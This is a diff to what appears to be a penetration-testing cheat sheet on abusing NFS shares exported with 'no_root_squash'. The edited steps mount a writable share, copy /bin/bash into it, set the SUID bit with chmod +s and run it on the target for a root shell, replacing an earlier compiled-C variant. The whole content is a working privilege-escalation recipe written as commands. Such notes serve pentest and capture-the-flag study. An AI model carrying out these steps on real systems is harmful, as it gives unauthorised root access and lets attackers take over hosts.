@@ -29,28 +29,26 @@
 
 # Critical element: "no_root_squash" on a writable share (SUID bit set file create) or fsid=0/fsid=root
 
-### 1: 
+### 1: Check the name of the folder
 
     showmount -e IP
 
-### 2: 
+### 2: Create directory
 
-    sudo mkdir /tmp/backups
+    mkdir /tmp/backups
 
-### 3: 
+### 3: Mount directory
 
     mount -o rw IP:/writable_share /tmp/backups
 
-### 4: Write a bash shell that spawns root (Rootshells directory in repo)
+### 4: Copy wanted shell
 
-### 5: 
+    cp /bin/bash .
 
-    gcc nfs.c -o nfs -w 
+### 6: Give SUID bit
 
-### 6: 
+    chmod +s bash
 
-    chmod +s nfs
+### 7: Execute from target machine
 
-### 
-
-    ./nfs
+    ./bash
